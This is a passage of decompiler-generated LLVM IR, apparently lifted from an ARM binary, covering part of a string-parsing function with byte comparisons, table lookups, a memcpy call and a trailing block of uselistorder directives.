  store i32 %v3_ca98, i32* %r2.global-to-local, align 4
  %v1_ca9c = inttoptr i32 %v1_caa4 to i8*
  %v2_ca9c = load i8, i8* %v1_ca9c, align 1
  %v3_ca9c = zext i8 %v2_ca9c to i32
  store i32 %v3_ca9c, i32* %r3.global-to-local, align 4
  %v9_caa0 = icmp eq i8 %v2_ca98, %v2_ca9c
  br i1 %v9_caa0, label %bb150, label %.thread24

bb150:                                            ; preds = %dec_label_pc_ca98
  %v2_caa4 = add i32 %v1_caa4, 9
  store i32 %v2_caa4, i32* %r1.global-to-local, align 4
  %v2_caa8 = add i32 %v1_caa8, 1
  store i32 %v2_caa8, i32* %r6.global-to-local, align 4
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_ca98, %dec_label_pc_ca84, %bb150
  %v0_cab0 = phi i32 [ %v1_caa4, %dec_label_pc_ca98 ], [ %v1_caa4, %dec_label_pc_ca84 ], [ %v2_caa4, %bb150 ]
  %v0_caac = phi i32 [ %v1_caa8, %dec_label_pc_ca98 ], [ %v1_caa8, %dec_label_pc_ca84 ], [ %v2_caa8, %bb150 ]
  %v1_caac = inttoptr i32 %v0_caac to i8*
  %v2_caac = load i8, i8* %v1_caac, align 1
  %v3_caac = zext i8 %v2_caac to i32
  store i32 %v3_caac, i32* %r2.global-to-local, align 4
  %v1_cab0 = add i32 %v0_cab0, 9
  %v2_cab0 = inttoptr i32 %v1_cab0 to i8*
  %v3_cab0 = load i8, i8* %v2_cab0, align 1
  %v4_cab0 = zext i8 %v3_cab0 to i32
  store i32 %v4_cab0, i32* %r3.global-to-local, align 4
  %v2_cab4 = icmp eq i8 %v2_caac, 0
  %v3_cab8 = mul nuw nsw i32 %v4_cab0, 256
  store i32 %v3_cab8, i32* @ip, align 4
  br i1 %v2_cab4, label %dec_label_pc_cd18, label %dec_label_pc_cac0

dec_label_pc_cac0:                                ; preds = %.thread24
  store i32 -38004, i32* %r3.global-to-local, align 4
  %v2_cac4 = add i32 %v0_ca60, -38004
  store i32 %v2_cac4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cac8

dec_label_pc_cac8:                                ; preds = %dec_label_pc_cb4c, %dec_label_pc_cac0
  %v1_cadc = phi i32 [ %v1_cb4c, %dec_label_pc_cb4c ], [ %v2_cac4, %dec_label_pc_cac0 ]
  %v1_cac8 = inttoptr i32 %v1_cadc to i8*
  %v2_cac8 = load i8, i8* %v1_cac8, align 1
  %v3_cac8 = zext i8 %v2_cac8 to i32
  store i32 %v3_cac8, i32* %r3.global-to-local, align 4
  %v9_cacc = icmp eq i8 %v2_cac8, %v2_caac
  br i1 %v9_cacc, label %dec_label_pc_cad4, label %dec_label_pc_cb4c

dec_label_pc_cad4:                                ; preds = %dec_label_pc_cac8
  store i32 %v2_cac4, i32* %r3.global-to-local, align 4
  %v2_cadc = sub i32 %v1_cadc, %v2_cac4
  store i32 %v2_cadc, i32* %r1.global-to-local, align 4
  %v7_cae4 = icmp slt i32 %v2_cadc, 18
  br i1 %v7_cae4, label %bb152, label %dec_label_pc_cae8

dec_label_pc_cae8:                                ; preds = %dec_label_pc_cad4
  %v1_cae8 = and i32 %v3_cab8, 1024
  %v2_cae8 = icmp eq i32 %v1_cae8, 0
  br i1 %v2_cae8, label %bb152, label %bb151

bb151:                                            ; preds = %dec_label_pc_cae8
  %v2_caec = add i32 %v2_cadc, -2
  store i32 %v2_caec, i32* %r1.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_cad4, %dec_label_pc_cae8, %bb151
  %v0_caf4 = phi i32 [ %v2_cadc, %dec_label_pc_cad4 ], [ %v2_cadc, %dec_label_pc_cae8 ], [ %v2_caec, %bb151 ]
  store i32 -38052, i32* %r3.global-to-local, align 4
  %v1_caf4 = load i32, i32* %r7.global-to-local, align 4
  %v2_caf4 = add i32 %v1_caf4, 32
  %v3_caf4 = inttoptr i32 %v2_caf4 to i32*
  store i32 %v0_caf4, i32* %v3_caf4, align 4
  %v0_caf8 = load i32, i32* @lr, align 4
  %v1_caf8 = load i32, i32* %r3.global-to-local, align 4
  %v2_caf8 = add i32 %v1_caf8, %v0_caf8
  store i32 %v2_caf8, i32* %r3.global-to-local, align 4
  %v1_cafc = add i32 %v2_caf8, -1
  store i32 %v1_cafc, i32* %r0.global-to-local, align 4
  %v0_cb04.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_cb00

dec_label_pc_cb00:                                ; preds = %dec_label_pc_cb00, %bb152
  %v0_cb00 = phi i32 [ %v1_cb00, %dec_label_pc_cb00 ], [ %v1_cafc, %bb152 ]
  %v1_cb00 = add i32 %v0_cb00, 1
  %v2_cb00 = inttoptr i32 %v1_cb00 to i8*
  %v3_cb00 = load i8, i8* %v2_cb00, align 1
  %v4_cb00 = zext i8 %v3_cb00 to i32
  store i32 %v4_cb00, i32* %r3.global-to-local, align 4
  store i32 %v1_cb00, i32* %r0.global-to-local, align 4
  %v8_cb08 = icmp sgt i32 %v0_cb04.pre, %v4_cb00
  br i1 %v8_cb08, label %dec_label_pc_cb00, label %dec_label_pc_cb0c

dec_label_pc_cb0c:                                ; preds = %dec_label_pc_cb00
  %v2_cb14.neg = sub i32 38052, %v0_caf8
  %v2_cb18 = add i32 %v2_cb14.neg, %v1_cb00
  %v2_cb1c = mul i32 %v2_cb18, 2
  store i32 %v2_cb1c, i32* %r2.global-to-local, align 4
  %v2_cb20 = add i32 %v0_caf8, -38068
  store i32 %v2_cb20, i32* %r3.global-to-local, align 4
  %v2_cb24 = add i32 %v2_cb1c, %v2_cb20
  %v3_cb24 = inttoptr i32 %v2_cb24 to i16*
  %v4_cb24 = load i16, i16* %v3_cb24, align 2
  %v6_cb24 = sext i16 %v4_cb24 to i32
  store i32 %v6_cb24, i32* %r1.global-to-local, align 4
  %v2_cb2c = add i32 %v0_caf8, -38084
  store i32 %v2_cb2c, i32* %r3.global-to-local, align 4
  %v2_cb30 = add i32 %v2_cb1c, %v2_cb2c
  %v3_cb30 = inttoptr i32 %v2_cb30 to i16*
  %v4_cb30 = load i16, i16* %v3_cb30, align 2
  %v6_cb30 = sext i16 %v4_cb30 to i32
  %v1_cb34 = load i32, i32* @ip, align 4
  %v2_cb34 = or i32 %v1_cb34, %v6_cb24
  %v2_cb38 = and i32 %v2_cb34, %v6_cb30
  store i32 %v2_cb38, i32* %r1.global-to-local, align 4
  store i32 -38004, i32* %r3.global-to-local, align 4
  %v2_cb40 = add i32 %v0_caf8, -38004
  store i32 %v2_cb40, i32* %r0.global-to-local, align 4
  store i32 %v2_cb38, i32* %stack_var_-72, align 4
  %v0_cb64.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_cb58

dec_label_pc_cb4c:                                ; preds = %dec_label_pc_cac8
  %v1_cb4c = add i32 %v1_cadc, 1
  %v2_cb4c = inttoptr i32 %v1_cb4c to i8*
  %v3_cb4c = load i8, i8* %v2_cb4c, align 1
  %v4_cb4c = zext i8 %v3_cb4c to i32
  store i32 %v4_cb4c, i32* %r3.global-to-local, align 4
  store i32 %v1_cb4c, i32* %r0.global-to-local, align 4
  %v2_cb50 = icmp eq i8 %v3_cb4c, 0
  br i1 %v2_cb50, label %dec_label_pc_cb58, label %dec_label_pc_cac8

dec_label_pc_cb58:                                ; preds = %dec_label_pc_cb4c, %dec_label_pc_cb0c
  %v0_cb64 = phi i32 [ %v0_cb64.pre, %dec_label_pc_cb0c ], [ %v0_caac, %dec_label_pc_cb4c ]
  %v0_cb60 = phi i32 [ %v1_cb34, %dec_label_pc_cb0c ], [ %v3_cab8, %dec_label_pc_cb4c ]
  %v0_cb58 = load i32, i32* @r4, align 4
  %v1_cb58 = and i32 %v0_cb58, 4
  %v1_cb5c = and i32 %v0_cb58, -5
  store i32 %v1_cb5c, i32* %r3.global-to-local, align 4
  %v1_cb60 = and i32 %v0_cb60, 3840
  store i32 %v1_cb60, i32* %r2.global-to-local, align 4
  %v1_cb64 = inttoptr i32 %v0_cb64 to i8*
  %v2_cb64 = load i8, i8* %v1_cb64, align 1
  %v3_cb64 = zext i8 %v2_cb64 to i32
  store i32 %v3_cb64, i32* %r1.global-to-local, align 4
  %v2_cb68 = or i32 %v1_cb5c, %v1_cb60
  store i32 %v2_cb68, i32* %r2.global-to-local, align 4
  %tmp180 = mul nuw nsw i32 %v1_cb58, 4
  %tmp181 = or i32 %tmp180, 32
  %v1_cb74 = load i32, i32* %r7.global-to-local, align 4
  %v2_cb74 = add i32 %v1_cb74, 20
  %v3_cb74 = inttoptr i32 %v2_cb74 to i32*
  store i32 %tmp181, i32* %v3_cb74, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cb7c = load i32, i32* %r1.global-to-local, align 4
  %v1_cb7c = load i32, i32* %r7.global-to-local, align 4
  %v2_cb7c = add i32 %v1_cb7c, 12
  %v3_cb7c = inttoptr i32 %v2_cb7c to i32*
  store i32 %v0_cb7c, i32* %v3_cb7c, align 4
  %v0_cb80 = load i32, i32* %r7.global-to-local, align 4
  %v1_cb80 = add i32 %v0_cb80, 4
  %v2_cb80 = inttoptr i32 %v1_cb80 to i32*
  %v3_cb80 = load i32, i32* @r5, align 4
  store i32 %v3_cb80, i32* %v2_cb80, align 4
  %v4_cb80 = add i32 %v0_cb80, 8
  %v5_cb80 = inttoptr i32 %v4_cb80 to i32*
  %v6_cb80 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_cb80, i32* %v5_cb80, align 4
  %v0_cb84 = load i32, i32* %r2.global-to-local, align 4
  %v1_cb84 = load i32, i32* %r7.global-to-local, align 4
  %v2_cb84 = add i32 %v1_cb84, 16
  %v3_cb84 = inttoptr i32 %v2_cb84 to i32*
  store i32 %v0_cb84, i32* %v3_cb84, align 4
  %v0_cb88 = load i32, i32* %r3.global-to-local, align 4
  %v1_cb88 = load i32, i32* %r7.global-to-local, align 4
  %v2_cb88 = add i32 %v1_cb88, 28
  %v3_cb88 = inttoptr i32 %v2_cb88 to i32*
  store i32 %v0_cb88, i32* %v3_cb88, align 4
  %v0_cb8c = load i32, i32* %r0.global-to-local, align 4
  %v1_cb8c = inttoptr i32 %v0_cb8c to i8*
  %v2_cb8c = load i8, i8* %v1_cb8c, align 1
  %v3_cb8c = zext i8 %v2_cb8c to i32
  store i32 %v3_cb8c, i32* %r2.global-to-local, align 4
  %v2_cb90 = icmp eq i8 %v2_cb8c, 0
  br i1 %v2_cb90, label %dec_label_pc_cb98, label %dec_label_pc_cc1c

dec_label_pc_cb98:                                ; preds = %dec_label_pc_cb58
  %v0_cb98 = load i32, i32* %r6.global-to-local, align 4
  %v1_cb98 = inttoptr i32 %v0_cb98 to i8*
  %v2_cb98 = load i8, i8* %v1_cb98, align 1
  %v3_cb98 = zext i8 %v2_cb98 to i32
  store i32 %v3_cb98, i32* %r3.global-to-local, align 4
  %v7_cb9c = icmp eq i8 %v2_cb98, 109
  br i1 %v7_cb9c, label %.thread28, label %dec_label_pc_cbb0

.thread28:                                        ; preds = %dec_label_pc_cb98
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_cba4 = load i32, i32* %r7.global-to-local, align 4
  %v3_cba4 = add i32 %v2_cba4, 32
  %v4_cba4 = inttoptr i32 %v3_cba4 to i32*
  store i32 20, i32* %v4_cba4, align 4
  %v1_cba8 = load i32, i32* %r2.global-to-local, align 4
  %v2_cba8 = load i32, i32* %r7.global-to-local, align 4
  %v3_cba8 = add i32 %v2_cba8, 28
  %v4_cba8 = inttoptr i32 %v3_cba8 to i32*
  store i32 %v1_cba8, i32* %v4_cba8, align 4
  br label %dec_label_pc_cc1c

dec_label_pc_cbb0:                                ; preds = %dec_label_pc_cb98
  store i32 536, i32* %r3.global-to-local, align 4
  %v0_cbb4 = load i32, i32* @lr, align 4
  %v2_cbb4 = add i32 %v0_cbb4, 536
  %v3_cbb4 = inttoptr i32 %v2_cbb4 to i32*
  %v4_cbb4 = load i32, i32* %v3_cbb4, align 4
  store i32 %v4_cbb4, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_cbbc = load i32, i32* %r7.global-to-local, align 4
  %v2_cbbc = add i32 %v1_cbbc, 32
  %v3_cbbc = inttoptr i32 %v2_cbbc to i32*
  store i32 21, i32* %v3_cbbc, align 4
  %v0_cbc0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_cbc0, i32* @ip, align 4
  %v1_cbc4 = add i32 %v0_cbc0, 10
  store i32 %v1_cbc4, i32* %r0.global-to-local, align 4
  %v0_cbcc.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_cbcc = inttoptr i32 %v0_cbcc.pre to i8*
  br label %dec_label_pc_cbc8

dec_label_pc_cbc8:                                ; preds = %dec_label_pc_cc0c, %dec_label_pc_cbb0
  %v1_cbd8 = phi i32 [ %v1_cc0c, %dec_label_pc_cc0c ], [ %v0_cbc0, %dec_label_pc_cbb0 ]
  %v1_cbc8 = inttoptr i32 %v1_cbd8 to i8*
  %v2_cbc8 = load i8, i8* %v1_cbc8, align 1
  %v3_cbc8 = zext i8 %v2_cbc8 to i32
  store i32 %v3_cbc8, i32* %r2.global-to-local, align 4
  %v2_cbcc = load i8, i8* %v1_cbcc, align 1
  %v3_cbcc = zext i8 %v2_cbcc to i32
  store i32 %v3_cbcc, i32* %r3.global-to-local, align 4
  %v9_cbd0 = icmp eq i8 %v2_cbc8, %v2_cbcc
  br i1 %v9_cbd0, label %dec_label_pc_cbd8, label %dec_label_pc_cc0c

dec_label_pc_cbd8:                                ; preds = %dec_label_pc_cbc8
  %v2_cbd8 = sub i32 %v1_cbd8, %v0_cbc0
  store i32 %v2_cbd8, i32* %r3.global-to-local, align 4
  %v0_cbe0 = load i32, i32* %r7.global-to-local, align 4
  %v1_cbe0 = add i32 %v0_cbe0, 4
  store i32 %v1_cbe0, i32* %r0.global-to-local, align 4
  %v0_cbe4 = load i32, i32* @lr, align 4
  %v2_cbe4 = add i32 %v0_cbe4, 13392
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_cbec = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_cbec, i32* %r2.global-to-local, align 4
  %v4_cbf0 = mul i32 %v2_cbd8, 4
  %v5_cbf0 = add i32 %v2_cbe4, %v4_cbf0
  %v6_cbf0 = inttoptr i32 %v5_cbf0 to i32*
  %v7_cbf0 = load i32, i32* %v6_cbf0, align 4
  store i32 %v7_cbf0, i32* @ip, align 4
  store i32 52220, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_cbf0)
  %v0_cbfc = load i32, i32* %r0.global-to-local, align 4
  %v1_cc00 = load i32, i32* %r7.global-to-local, align 4
  %v2_cc00 = add i32 %v1_cc00, 28
  %v3_cc00 = inttoptr i32 %v2_cc00 to i32*
  store i32 %v0_cbfc, i32* %v3_cc00, align 4
  %v7_cc04 = icmp sgt i32 %v0_cbfc, 5
  br i1 %v7_cc04, label %dec_label_pc_cd18, label %dec_label_pc_cc1c

dec_label_pc_cc0c:                                ; preds = %dec_label_pc_cbc8
  %v1_cc0c = add i32 %v1_cbd8, 1
  store i32 %v1_cc0c, i32* %r1.global-to-local, align 4
  %v3_cc10 = icmp ult i32 %v1_cc0c, %v1_cbc4
  br i1 %v3_cc10, label %dec_label_pc_cbc8, label %dec_label_pc_cd18

dec_label_pc_cc1c:                                ; preds = %.thread28, %dec_label_pc_cbd8, %dec_label_pc_cb58
  %v0_cc1c = load i32, i32* %fp.global-to-local, align 4
  %tmp156 = icmp slt i32 %v0_cc1c, 1
  br i1 %tmp156, label %dec_label_pc_ccc8, label %dec_label_pc_cc24

dec_label_pc_cc24:                                ; preds = %dec_label_pc_cc1c
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_cc3c = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_cc28

dec_label_pc_cc28:                                ; preds = %dec_label_pc_ccb0, %dec_label_pc_cc24
  %v9_cc48 = phi i32 [ 0, %dec_label_pc_cc24 ], [ %v1_ccb4, %dec_label_pc_ccb0 ]
  %v7_cc2c = icmp sgt i32 %v9_cc48, 2
  br i1 %v7_cc2c, label %.thread38, label %bb157

.thread38:                                        ; preds = %dec_label_pc_cc28
  store i32 %v9_cc3c, i32* %r3.global-to-local, align 4
  %v10_cc48 = add i32 %v9_cc48, %v9_cc3c
  store i32 %v10_cc48, i32* %r1.global-to-local, align 4
  br label %bb158

bb157:                                            ; preds = %dec_label_pc_cc28
  store i32 %v3_c8a4.pre-phi, i32* @ip, align 4
  %v12_cc30 = mul i32 %v9_cc48, 4
  %v13_cc30 = add i32 %v12_cc30, %v3_c8a4.pre-phi
  store i32 %v13_cc30, i32* %r3.global-to-local, align 4
  %v9_cc38 = add i32 %v13_cc30, -12
  %v10_cc38 = inttoptr i32 %v9_cc38 to i8*
  %v11_cc38 = load i8, i8* %v10_cc38, align 4
  %v12_cc38 = zext i8 %v11_cc38 to i32
  store i32 %v12_cc38, i32* %r2.global-to-local, align 4
  %v9_cc40 = load i32, i32* %r7.global-to-local, align 4
  %v10_cc40 = add i32 %v9_cc40, %v9_cc48
  store i32 %v10_cc40, i32* %r3.global-to-local, align 4
  store i32 %v12_cc38, i32* %r1.global-to-local, align 4
  %v11_cc4c = add i32 %v10_cc40, 36
  %v12_cc4c = inttoptr i32 %v11_cc4c to i8*
  store i8 %v11_cc38, i8* %v12_cc4c, align 1
  %v0_cc50.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread38, %bb157
  %v0_cc70 = phi i32 [ %v10_cc48, %.thread38 ], [ %v0_cc50.pre, %bb157 ]
  %v1_cc50 = load i32, i32* %fp.global-to-local, align 4
  %v2_cc50 = sub i32 %v0_cc70, %v1_cc50
  %v4_cc50 = xor i32 %v1_cc50, %v0_cc70
  %v5_cc50 = xor i32 %v2_cc50, %v0_cc70
  %v6_cc50 = and i32 %v5_cc50, %v4_cc50
  %v7_cc50 = icmp slt i32 %v6_cc50, 0
  %v8_cc50 = icmp slt i32 %v2_cc50, 0
  %v9_cc50 = icmp eq i32 %v0_cc70, %v1_cc50
  %v3_cc54 = xor i1 %v8_cc50, %v7_cc50
  %v4_cc54 = or i1 %v9_cc50, %v3_cc54
  br i1 %v4_cc54, label %dec_label_pc_cc64, label %dec_label_pc_cc58

dec_label_pc_cc58:                                ; preds = %bb158
  %v1_cc58 = add i32 %v0_cc70, -9
  %v3_cc58 = sub i32 8, %v0_cc70
  %v4_cc58 = and i32 %v3_cc58, %v0_cc70
  %v5_cc58 = icmp slt i32 %v4_cc58, 0
  %v6_cc58 = icmp slt i32 %v1_cc58, 0
  %v7_cc58 = icmp eq i32 %v0_cc70, 9
  %v3_cc5c = xor i1 %v6_cc58, %v5_cc58
  %v4_cc5c = or i1 %v7_cc58, %v3_cc5c
  br i1 %v4_cc5c, label %dec_label_pc_cc60, label %dec_label_pc_cd18

dec_label_pc_cc60:                                ; preds = %dec_label_pc_cc58
  store i32 %v0_cc70, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_cc64

dec_label_pc_cc64:                                ; preds = %bb158, %dec_label_pc_cc60
  store i32 %v3_c8a4.pre-phi, i32* @r2, align 4
  %v1_cc68 = load i32, i32* %r8.global-to-local, align 4
  %v4_cc68 = mul i32 %v1_cc68, 4
  %v5_cc68 = add i32 %v4_cc68, %v3_c8a4.pre-phi
  store i32 %v5_cc68, i32* %sb.global-to-local, align 4
  %v1_cc6c = add i32 %v5_cc68, -40
  %v2_cc6c = inttoptr i32 %v1_cc6c to i32*
  %v3_cc6c = load i32, i32* %v2_cc6c, align 4
  store i32 %v3_cc6c, i32* %r5.global-to-local, align 4
  %v1_cc70 = add i32 %v0_cc70, -1
  store i32 %v1_cc70, i32* %r3.global-to-local, align 4
  %v0_cc74 = load i32, i32* %r7.global-to-local, align 4
  %v4_cc74 = mul i32 %v1_cc70, 4
  %v5_cc74 = add i32 %v0_cc74, %v4_cc74
  store i32 %v5_cc74, i32* %sl.global-to-local, align 4
  %v7_cc78 = icmp eq i32 %v3_cc6c, 8
  %v1_cc7c = add i32 %v5_cc74, 40
  %v2_cc7c = inttoptr i32 %v1_cc7c to i32*
  %v3_cc7c = load i32, i32* %v2_cc7c, align 4
  store i32 %v3_cc7c, i32* @r0, align 4
  br i1 %v7_cc78, label %dec_label_pc_ccb0, label %dec_label_pc_cc84

dec_label_pc_cc84:                                ; preds = %dec_label_pc_cc64
  %v9_cc84 = icmp eq i32 %v3_cc7c, %v3_cc6c
  br i1 %v9_cc84, label %dec_label_pc_cca8, label %bb159

bb159:                                            ; preds = %dec_label_pc_cc84
  %v8_cc88 = icmp eq i32 %v3_cc7c, 8
  br i1 %v8_cc88, label %dec_label_pc_cca8, label %dec_label_pc_cc90

dec_label_pc_cc90:                                ; preds = %bb159
  %v0_cc90 = call i32 @_promoted_size()
  %v0_cc98 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_cc98, i32* @r0, align 4
  %v0_cc9c = call i32 @_promoted_size()
  store i32 %v0_cc9c, i32* %r0.global-to-local, align 4
  %v8_cca4 = icmp sgt i32 %v0_cc90, %v0_cc9c
  br i1 %v8_cca4, label %dec_label_pc_ccb0, label %dec_label_pc_cc90.dec_label_pc_cca8_crit_edge

dec_label_pc_cc90.dec_label_pc_cca8_crit_edge:    ; preds = %dec_label_pc_cc90
  %v0_cca8.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_ccac.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_cca8

dec_label_pc_cca8:                                ; preds = %dec_label_pc_cc90.dec_label_pc_cca8_crit_edge, %dec_label_pc_cc84, %bb159
  %v1_ccac = phi i32 [ %v1_ccac.pre, %dec_label_pc_cc90.dec_label_pc_cca8_crit_edge ], [ %v5_cc74, %dec_label_pc_cc84 ], [ %v5_cc74, %bb159 ]
  %v0_cca8 = phi i32 [ %v0_cca8.pre, %dec_label_pc_cc90.dec_label_pc_cca8_crit_edge ], [ %v5_cc68, %dec_label_pc_cc84 ], [ %v5_cc68, %bb159 ]
  %v1_cca8 = add i32 %v0_cca8, -40
  %v2_cca8 = inttoptr i32 %v1_cca8 to i32*
  %v3_cca8 = load i32, i32* %v2_cca8, align 4
  store i32 %v3_cca8, i32* %r3.global-to-local, align 4
  %v2_ccac = add i32 %v1_ccac, 40
  %v3_ccac = inttoptr i32 %v2_ccac to i32*
  store i32 %v3_cca8, i32* %v3_ccac, align 4
  br label %dec_label_pc_ccb0

dec_label_pc_ccb0:                                ; preds = %dec_label_pc_cc90, %dec_label_pc_cc64, %dec_label_pc_cca8
  %v0_ccb0 = load i32, i32* %r7.global-to-local, align 4
  %v1_ccb0 = add i32 %v0_ccb0, 28
  %v2_ccb0 = inttoptr i32 %v1_ccb0 to i32*
  %v3_ccb0 = load i32, i32* %v2_ccb0, align 4
  %v0_ccb4 = load i32, i32* %r8.global-to-local, align 4
  %v1_ccb4 = add i32 %v0_ccb4, 1
  store i32 %v1_ccb4, i32* %r8.global-to-local, align 4
  %v1_ccb8 = add i32 %v3_ccb0, 2
  store i32 %v1_ccb8, i32* %r3.global-to-local, align 4
  %v6_ccc0 = icmp slt i32 %v1_ccb4, %v1_ccb8
  br i1 %v6_ccc0, label %dec_label_pc_cc28, label %dec_label_pc_cce4

dec_label_pc_ccc8:                                ; preds = %dec_label_pc_cc1c
  %v0_ccc8 = load i32, i32* %r7.global-to-local, align 4
  %v1_ccc8 = add i32 %v0_ccc8, 28
  %v2_ccc8 = inttoptr i32 %v1_ccc8 to i32*
  %v3_ccc8 = load i32, i32* %v2_ccc8, align 4
  store i32 %v3_ccc8, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_ccd0 = add i32 %v0_ccc8, 38
  %v4_ccd0 = inttoptr i32 %v3_ccd0 to i8*
  store i8 1, i8* %v4_ccd0, align 1
  %v0_ccd4 = load i32, i32* %r2.global-to-local, align 4
  %v3_ccd4 = mul i32 %v0_ccd4, 4
  store i32 %v3_ccd4, i32* @r2, align 4
  %v0_ccd8 = load i32, i32* %r7.global-to-local, align 4
  %v1_ccd8 = add i32 %v0_ccd8, 40
  store i32 %v1_ccd8, i32* @r0, align 4
  %v2_ccdc = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_ccdc, i32* @r1, align 4
  %v0_cce0 = call i32 @memcpy()
  store i32 %v0_cce0, i32* %r0.global-to-local, align 4
  %v0_cce4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cce4

dec_label_pc_cce4:                                ; preds = %dec_label_pc_ccb0, %dec_label_pc_ccc8
  %v2_cd00 = phi i32 [ %v0_cce4.pre, %dec_label_pc_ccc8 ], [ %v0_ccb0, %dec_label_pc_ccb0 ]
  %v1_cce4 = add i32 %v2_cd00, 16
  %v2_cce4 = inttoptr i32 %v1_cce4 to i32*
  %v3_cce4 = load i32, i32* %v2_cce4, align 4
  store i32 %v3_cce4, i32* %r3.global-to-local, align 4
  %v1_cce8 = and i32 %v3_cce4, 128
  %v2_cce8 = icmp eq i32 %v1_cce8, 0
  br i1 %v2_cce8, label %.thread50, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_cce4
  %v3_ccec = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_ccec, i32* %r3.global-to-local, align 4
  %v2_ccf0 = inttoptr i32 %v2_cd00 to i32*
  %v3_ccf0 = load i32, i32* %v2_ccf0, align 4
  %v2_ccf8.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_ccf8 = sub i32 %v2_ccf8.pre, %v3_ccec
  store i32 %v3_ccf8, i32* %r3.global-to-local, align 4
  %v5_ccfc = mul i32 %v3_ccf8, 4
  %v6_ccfc = add i32 %v5_ccfc, %v3_ccf0
  store i32 %v6_ccfc, i32* @r2, align 4
  br label %bb160

.thread50:                                        ; preds = %dec_label_pc_cce4
  %v1_ccf445 = load i32, i32* %r6.global-to-local, align 4
  %v2_ccf446 = add i32 %v1_ccf445, 1
  store i32 %v2_ccf446, i32* %r3.global-to-local, align 4
  %v3_cd00 = inttoptr i32 %v2_cd00 to i32*
  store i32 %v2_ccf446, i32* %v3_cd00, align 4
  %v0_cd04.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb160

bb160:                                            ; preds = %.thread48, %.thread50
  %v1_cd0c = phi i32 [ %v2_cd00, %.thread48 ], [ %v0_cd04.pre, %.thread50 ]
  %v1_cd04 = add i32 %v1_cd0c, 28
  %v2_cd04 = inttoptr i32 %v1_cd04 to i32*
  %v3_cd04 = load i32, i32* %v2_cd04, align 4
  store i32 %v3_cd04, i32* %r3.global-to-local, align 4
  %v1_cd08 = add i32 %v3_cd04, 2
  store i32 %v1_cd08, i32* %r0.global-to-local, align 4
  %v0_cd0c = load i32, i32* %fp.global-to-local, align 4
  %v2_cd0c = add i32 %v1_cd0c, 24
  %v3_cd0c = inttoptr i32 %v2_cd0c to i32*
  store i32 %v0_cd0c, i32* %v3_cd0c, align 4
  br i1 %v2_cce8, label %dec_label_pc_cd1c, label %bb161

bb161:                                            ; preds = %bb160
  %v1_cd10 = load i32, i32* @r2, align 4
  %v2_cd10 = load i32, i32* %r7.global-to-local, align 4
  %v3_cd10 = inttoptr i32 %v2_cd10 to i32*
  store i32 %v1_cd10, i32* %v3_cd10, align 4
  br label %dec_label_pc_cd1c

dec_label_pc_cd18:                                ; preds = %dec_label_pc_cc0c, %dec_label_pc_c82c, %dec_label_pc_c974, %dec_label_pc_ca20, %dec_label_pc_c9f8, %dec_label_pc_ca04, %dec_label_pc_c940, %dec_label_pc_cc58, %dec_label_pc_cbd8, %.thread24
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cd1c

dec_label_pc_cd1c:                                ; preds = %bb161, %bb160, %dec_label_pc_cd18
  %v2_cd20 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_cd20, i32* @r4, align 4
  store i32 %v6_c7e8, i32* @r5, align 4
  store i32 %v27_c7e8, i32* @lr, align 4
  %v1_cd24 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_cd24

; uselistorder directives
  uselistorder i32 %v3_ccf8, { 1, 0 }
  uselistorder i32 %v1_ccb4, { 1, 2, 0 }
  uselistorder i32 %v2_cc50, { 1, 0 }
  uselistorder i32 %v1_cc50, { 1, 0, 2 }
  uselistorder i32 %v0_cc70, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_cc48, { 0, 2, 1, 3 }
  uselistorder i32 %v1_cc0c, { 1, 2, 0 }
  uselistorder i32 %v0_cbfc, { 1, 0 }
  uselistorder i32 %v1_cbd8, { 1, 0, 2 }
  uselistorder i32 %v1_cb4c, { 1, 2, 0 }
  uselistorder i32 %v1_cb34, { 1, 0 }
  uselistorder i32 %v2_cb1c, { 2, 1, 0 }
  uselistorder i32 %v1_cb00, { 0, 2, 3, 1 }
  uselistorder i32 %v0_caf8, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_cadc, { 1, 0, 2 }
  uselistorder i32 %v2_cac4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_cab8, { 2, 1, 0 }
  uselistorder i32 %v1_ca78, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ca68.pre, { 0, 2, 1 }
  uselistorder i32 %v2_ca44, { 1, 0 }
  uselistorder i32 %v5_c9a4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_c9a4, { 1, 0 }
  uselistorder i32 %v0_c9a876, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_c94c, { 1, 0 }
  uselistorder i32 %v0_c96c, { 3, 2, 0, 1, 4 }
